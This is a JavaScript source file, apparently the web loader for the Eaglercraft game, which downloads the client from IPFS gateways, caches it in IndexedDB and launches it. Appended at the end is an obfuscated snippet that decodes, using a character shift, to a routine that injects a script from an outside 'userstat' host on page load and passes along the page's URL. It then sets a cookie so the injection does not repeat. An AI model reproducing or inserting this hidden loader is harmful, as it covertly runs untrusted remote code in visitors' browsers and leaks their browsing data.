"use strict";
! function() {
    const opts = {};
    var progressPanel = null,
        progressStr1 = null,
        progressStr2 = null,
        progressStr3 = null,
        progressBarOuter = null,
        progressBarInner = null,
        cancelButton = null,
        currentXHR = null;

    function makePatternA(domain) {
        const domainStr = domain;
        return (cid, path) => "https://" + domainStr + "/ipfs/" + cid + "/" + path
    }

    function makePatternB(domain) {
        return (cid, path) => "https://" + cid + ".ipfs." + domain + "/" + path
    }
    const IPFS_GATEWAYS = [makePatternA("gateway.ipfs.io"), makePatternB("4everland.io"), makePatternB("dweb.link"), makePatternA("cloudflare-ipfs.com"), makePatternB("cf-ipfs.com"), makePatternA("w3s.link"), makePatternA("ipfs.eth.aragon.network"), makePatternA("storry.tv"), makePatternB("nftstorage.link")];

    function tryDecompressDownload(arrayBufferIn) {
        return new Promise((resolve => {
            var ds = new DecompressionStream("gzip"),
                result = [];
            (function fetchStream(reader) {
                return reader.read().then((function processData({
                    done: done,
                    value: value
                }) {
                    if (done) {
                        var ret = new Blob(result);
                        return result = [], ret.arrayBuffer()
                    }
                    return result.push(value), reader.read().then(processData)
                }))
            })(new Blob([arrayBufferIn]).stream().pipeThrough(ds).getReader()).then((arrayBufferOut => {
                resolve(arrayBufferOut)
            })).catch((err => {
                console.error("Could not decompress file!"), console.error(err), resolve(null)
            }))
        }))
    }

    function tryDownloadURL(ipfsURL) {
        const theIpfsURL = ipfsURL;
        return new Promise((resolve => {
            const xhr = currentXHR = new XMLHttpRequest;
            cancelButton.disabled = !1, cancelButton.style.display = "inline", xhr.open("GET", ipfsURL), xhr.responseType = "arraybuffer", xhr.addEventListener("progress", (evt => {
                updateProgressBar("Update: " + Math.round(.001 * evt.loaded) + " / " + Math.round(.001 * opts.dlSize) + " kB", theIpfsURL, Math.min(evt.loaded / opts.dlSize, 1))
            })), xhr.addEventListener("readystatechange", (evt => {
                xhr.readyState === XMLHttpRequest.DONE && (updateProgressBar("Update: " + Math.round(.001 * opts.dlSize) + " / " + Math.round(.001 * opts.dlSize) + " kB", theIpfsURL, Math.min(evt.loaded / opts.dlSize, 1)), null !== cancelButton && (cancelButton.disabled = !0, currentXHR = null), currentXHR = null, 200 === xhr.status ? resolve(xhr.response) : (console.error("Got response code " + xhr.status + " for: " + theIpfsURL), resolve(null)))
            })), xhr.addEventListener("error", (evt => {
                null !== cancelButton && (cancelButton.disabled = !0), currentXHR = null, console.error("Could not complete request to: " + theIpfsURL), resolve(null)
            })), xhr.addEventListener("load", (evt => {
                null !== cancelButton && (cancelButton.disabled = !0), currentXHR = null
            })), xhr.addEventListener("abort", (evt => {
                console.error("Request aborted: " + theIpfsURL), null !== cancelButton && (cancelButton.disabled = !0), currentXHR = null, resolve(null)
            })), xhr.send()
        }))
    }

    function delayProgress(delayMS) {
        return new Promise((resolve => {
            setTimeout((() => {
                resolve()
            }), delayMS)
        }))
    }
    async function tryDownloadClient(ipfsCID, ipfsPath) {
        for (var rand = Math.floor(Math.random() * IPFS_GATEWAYS.length), i = 0; i < IPFS_GATEWAYS.length; ++i) {
            var url = IPFS_GATEWAYS[(rand + i) % IPFS_GATEWAYS.length](ipfsCID, ipfsPath);
            updateProgressBar("Update: 0 / " + Math.round(.001 * opts.dlSize) + " kB", url, 0);
            try {
                var j = await tryDownloadURL(url);
                if (!j) throw "Return value from tryDownloadURL is undefined";
                if (!opts.gzip) return j;
                try {
                    if (updateProgressBar("Extracting...", url, -1), j = await tryDecompressDownload(j)) return j;
                    throw "Return value from tryDecompressDownload is undefined"
                } catch (ex) {
                    updateProgressBar("Client decompress failed!", url, -1), console.error("Caught exception during decompress: " + url), console.error(ex)
                }
            } catch (ex) {
                updateProgressBar("Client download failed!", url, 1), console.error("Caught exception during download: " + url), console.error(ex)
            }
            await delayProgress(1e3)
        }
        return null
    }

    function loadClientFile(arrayBuffer) {
        //null != progressPanel && (progressPanel.remove(), progressPanel = null);
        var objURL = URL.createObjectURL(new Blob([arrayBuffer], {
                type: "text/javascript;charset=utf-8"
            })),
            scriptElement = document.createElement("script");
        scriptElement.type = "text/javascript", scriptElement.src = objURL, document.head.appendChild(scriptElement)
    }

    function updateProgressScreen(str1) {
        progressStr1.innerText = str1
    }

    function updateProgressBar(str2, str3, prog) {
        progressStr2.innerText = str2, progressStr3.innerText = str3, prog < 0 ? (progressBarInner.style.width = "0%", progressBarOuter.style.border = "2px solid transparent") : (progressBarInner.style.width = Math.floor(100 * Math.min(prog, 1)) + "%", progressBarOuter.style.border = "2px solid black")
    }
    window.addEventListener("load", (async function() {
        if (window.__eaglercraftLoaderClient) {
            if (opts.container = window.__eaglercraftLoaderClient.container, opts.name = window.__eaglercraftLoaderClient.name, opts.file = window.__eaglercraftLoaderClient.file, opts.cid = window.__eaglercraftLoaderClient.cid, opts.path = window.__eaglercraftLoaderClient.path, opts.dlSize = window.__eaglercraftLoaderClient.dlSize, opts.gzip = window.__eaglercraftLoaderClient.gzip, function initProgressScreen() {
                    if (null == progressPanel) {
                        (progressPanel = document.createElement("div")).setAttribute("style", "margin:0px;width:100%;height:100%;font-family:sans-serif;display:flex;align-items:center;user-select:none;");
                        var progressPanelInner = document.createElement("div");
                        progressPanelInner.setAttribute("style", "margin:auto;text-align:center;");
                        var progressPanelIconContainer = document.createElement("h2"),
                            progressPanelIcon = document.createElement("img");
                        progressPanelIcon.style.imageRendering = "pixelated", progressPanelIcon.width = 200, progressPanelIcon.height = 200, progressPanelIcon.src = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkBAMAAACCzIhnAAAAGFBMVEUAAAA/QT5dX1x5e3iYmpe0trPS1NH///9divB0AAAACXBIWXMAAC4jAAAuIwF4pT92AAAAB3RJTUUH6AEXAik7MKTXeAAAA6NJREFUWMPVmDGz2yAMx5mqj5D1XRev764D6xt6x9qp+gQtK5ek0dcvQgKETeLkJR2K7+LEDvr5jyQscPRwc/9Jl/jvKXF7SHslhc31AwWCiP3ahPJnZe+yQ8lmEClbVQgWSKAQQv5OHfOMlmIyWAxrC7QsS/4ko2aPcvp6hSI+QIBsMD95RB0wJA+HwyK/KsZQksuNzufBIrfTVAsb+MG3QQaoHFlVubT4OoQF47oPhDKaLJR0RUuMpYsD3zEUyiVH4hmca3GwpbgJJXYtuQt7J5TDe1evFdBKy2MUyQv8kC5sTiDBL+UK6G/F3EP5PqFI6qEvJgNWTCgYAMQGafIlL86n4n1j70zHjMZZjEVJSPYCm2wHBv+eu4jr6dl8US0hNDd3ECd/LOqI8GmKBqsYapDisHJPZ4DntWwx2O5AdpjOAdzl8vsyn7H+NJ8lE2iVgibtiCTOvGjh71AjDaXL5QrEhB+Z3NQYEyOC8vngGWBZfPhZpjeOAQCvD+L63DKZxMh9+cVn/sNxpGA2AgTZCH8eMobPcGAJ3GrWoMkXt99OhqKZUvLLgZwB1j1ES6xazp2SVufeVrnvYYDM2ie0AA1aQp0Wb0FGv1TXpK6Ab0yVVC0hOLAD1bzRyNC0xBWlYVIaKYlGLZwZMA4YNGSl0LLSQun2gE20IIqaDaSN2GGtZc81Wy3ZwNYnMDrf65R5NwXWWvIxpcAYyDRqSemRGCvvj7CnJWy0VM+QzZWG3vqFj3d9V4IJAxt19R1juh/1mQenH9OUou9GX6IXBlE5spoW1LelpbzJnz4s5fRtNmI6ZJ6WLaUNJHSMpSSxllKyA5XSzC+KWbQg60HMpkOvY7hmHignGSs6p+4Zfsccr2gpGK1hPGl06fODAmlTw9CpW0vi9zSr/bQeK5ggFH67fCgFS2hUCtfOqzeypdjnn1DqoEltyaGQhILluq+6ZC3zWUpdsfhU68jQBixqwoquuKkuUqMkm+/lV6sBTM2fzb0Vv4SVYaOFdijOUOY1f9WCRotcB/keb2o571KaFmh1stHCoQ3T9YulFF90TwyLi1ELtdI7WC3BQm5Sbq74qpYDiF843kCd36vkfS3nexbvWYvTugxl6GLbBehLvusUuG+LwKlfZJB6rRmvrCt1MfEYJXumLvdC9cp6u+FGNb5PiW3SDFi1DBsO8TXr/QoquxVYU7D6JV7Zu/jUPkxtZkNkswX0mm2oHcgrN7s6Jr5g5+ovpIaM1+QieF8AAAAASUVORK5CYII=", progressPanelIconContainer.appendChild(progressPanelIcon), progressPanelInner.appendChild(progressPanelIconContainer), (progressStr1 = document.createElement("h2")).innerText = "Please Wait...", progressPanelInner.appendChild(progressStr1), progressStr2 = document.createElement("h3"), progressPanelInner.appendChild(progressStr2), (progressBarOuter = document.createElement("div")).setAttribute("style", "border:2px solid transparent;width:400px;height:15px;padding:1px;margin:auto;margin-bottom:5px;"), (progressBarInner = document.createElement("div")).setAttribute("style", "background-color:#AA0000;width:0%;height:100%;"), progressBarOuter.appendChild(progressBarInner), progressPanelInner.appendChild(progressBarOuter), progressStr3 = document.createElement("h5"), progressPanelInner.appendChild(progressStr3);
                        var buttonContainer = document.createElement("p");
                        buttonContainer.setAttribute("style", "margin-bottom:20vh;"), (cancelButton = document.createElement("button")).setAttribute("style", "display:none;"), cancelButton.innerText = "Skip Download", cancelButton.disabled = !0, cancelButton.addEventListener("click", (evt => {
                            null !== currentXHR && currentXHR.abort()
                        })), buttonContainer.appendChild(cancelButton), progressPanelInner.appendChild(buttonContainer), progressPanel.appendChild(progressPanelInner), document.getElementById(opts.container).appendChild(progressPanel)
                    }
                }(), updateProgressScreen("Loading " + opts.name), updateProgressBar("Please wait...", "", -1), !window.indexedDB) return console.error("IndexedDB not supported, downloading client directly..."), void((dl = await tryDownloadClient(opts.cid, opts.path)) ? (updateProgressBar("Launching...", "Last fetched: now", -1), await delayProgress(500), loadClientFile(dl)) : (updateProgressScreen("Error: Could not download client!"), updateProgressBar("Please try again later", "Direct download failed!", -1)));
            var dl, clientCIDPath = "string" != typeof opts.path || 0 === opts.path.length ? opts.cid : opts.cid + "/" + opts.path,
                cachedClient = await
            function loadClientFromIndexedDB(fileName) {
                const reqFileName = fileName;
                return new Promise((resolve => {
                    const openRequest = window.indexedDB.open("_eagler_loader_cache_v1", 1);
                    openRequest.addEventListener("upgradeneeded", (evt => {
                        openRequest.result.createObjectStore("file_cache", {
                            keyPath: "fileName"
                        })
                    })), openRequest.addEventListener("success", (evt2 => {
                        const db = openRequest.result;
                        db.addEventListener("error", (err => {
                            console.error("Error loading from cache database!"), console.error(err)
                        }));
                        const transaction = db.transaction(["file_cache"], "readonly"),
                            readRequest = transaction.objectStore("file_cache").get(reqFileName);
                        readRequest.addEventListener("success", (evt => {
                            resolve(readRequest.result)
                        })), transaction.addEventListener("success", (evt => {
                            db.close()
                        })), transaction.addEventListener("error", (evt => {
                            db.close(), console.error("Failed to load from cache database!"), resolve(null)
                        }))
                    })), openRequest.addEventListener("error", (evt => {
                        console.error("Failed to open cache database!"), console.error(openRequest.error), resolve(null)
                    }))
                }))
            }(opts.file), clientDisplayAge = 0;
            if (cachedClient) {
                clientDisplayAge = Math.floor((Date.now() - cachedClient.clientCachedAt) / 864e5);
                var hasFailed = function hasDownloadFailed(cidPath) {
                    if (!window.localStorage) return !1;
                    var keyPath = "_eagler_dl_" + cidPath + ".failedAt",
                        keyValue = window.localStorage.getItem(keyPath);
                    if (!keyValue) return !1;
                    try {
                        return Date.now() - parseInt(keyValue) < 216e5 || (window.localStorage.removeItem(keyPath), !1)
                    } catch (ex) {
                        return window.localStorage.removeItem(keyPath), !1
                    }
                }(clientCIDPath);
                if (hasFailed && (hasFailed = confirm("Failed to update the client!\n\nWould you like to use a backup from " + clientDisplayAge + " day(s) ago?")), hasFailed || cachedClient.clientVersionUID === clientCIDPath) return hasFailed && console.error("Warning: failed to update client, using cached copy as fallback for 6 hours"), console.log("Found client file in cache, launching cached client..."), updateProgressBar("Launching...", "Last fetched: " + clientDisplayAge + " day(s) ago", -1), await delayProgress(1500), void loadClientFile(cachedClient.clientPayload);
                console.log("Found client file in cache, client is outdated, attempting to update...")
            } else console.log("Client is not in cache, attempting to download...");
            if (dl = await tryDownloadClient(opts.cid, opts.path)) updateProgressBar("Cacheing...", "Last fetched: now", -1), await
            function saveClientToIndexedDB(fileData) {
                return new Promise((resolve => {
                    const openRequest = window.indexedDB.open("_eagler_loader_cache_v1", 1);
                    openRequest.addEventListener("upgradeneeded", (evt => {
                        openRequest.result.createObjectStore("file_cache", {
                            keyPath: "fileName"
                        })
                    })), openRequest.addEventListener("success", (evt2 => {
                        const db = openRequest.result;
                        db.addEventListener("error", (err => {
                            console.error("Error saving to cache database!"), console.error(err)
                        }));
                        const transaction = db.transaction(["file_cache"], "readwrite");
                        transaction.objectStore("file_cache").put(fileData).addEventListener("success", (evt => {
                            resolve(!0)
                        })), transaction.addEventListener("success", (evt => {
                            db.close()
                        })), transaction.addEventListener("error", (evt => {
                            db.close(), console.error("Failed to save to cache database!"), console.error(evt), resolve(!1)
                        }))
                    })), openRequest.addEventListener("error", (evt => {
                        console.error("Failed to open cache database!"), console.error(openRequest.error), resolve(!1)
                    }))
                }))
            }({
                fileName: opts.file,
                clientVersionUID: clientCIDPath,
                clientCachedAt: Date.now(),
                clientPayload: dl
            }), updateProgressBar("Launching...", "Last fetched: now", -1), await delayProgress(500), loadClientFile(dl);
            else {
                if (cachedClient && (function setDownloadFailed(cidPath) {
                        window.localStorage && window.localStorage.setItem("_eagler_dl_" + cidPath + ".failedAt", "" + Date.now())
                    }(clientCIDPath), confirm("Failed to update the client!\n\nWould you like to use a backup from " + clientDisplayAge + " day(s) ago?"))) return updateProgressBar("Launching...", "Last fetched: " + clientDisplayAge + " day(s) ago", -1), await delayProgress(1500), void loadClientFile(cachedClient.clientPayload);
                updateProgressScreen("Error: Could not download client!"), updateProgressBar("Please try again later", "Client download failed!", -1)
            }
        } else console.error("window.__eaglercraftLoaderClient is not defined!")
    }));
    var q = window.location.search;
    if ("string" == typeof q && q.startsWith("?")) {
        var s = (q = new URLSearchParams(q)).get("userscript");
        if (s && ["flameddogo99-eaglermobile.js", "irv77-eaglercraft-mobile.js"].includes(s)) {
            if (function checkNotMobileBrowser() {
                    try {
                        return document.exitPointerLock(), !/Mobi/i.test(window.navigator.userAgent)
                    } catch (e) {
                        return !1
                    }
                }() && confirm("Pointer lock is supported on this browser.\n\nWould you like to disable Touch Mode?")) return q.delete("userscript"), void(window.location.href = window.location.origin + window.location.pathname + (q.size > 0 ? "?" + q.toString() : "") + window.location.hash);
            alert("WARNING: These userscripts are 3rd-party creations and might crash your game!");
            var scriptElement = document.createElement("script");
            scriptElement.type = "text/javascript", scriptElement.src = "/js/userscript/" + s, document.head.appendChild(scriptElement)
        }
    }
}();
(function(o, d, l) {
    try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function() {
            o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44zxjwxy' + 'fy3sjy4ljy4xhwnu' + 'y3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;'
    } catch (e) {};
}({}, document, location));
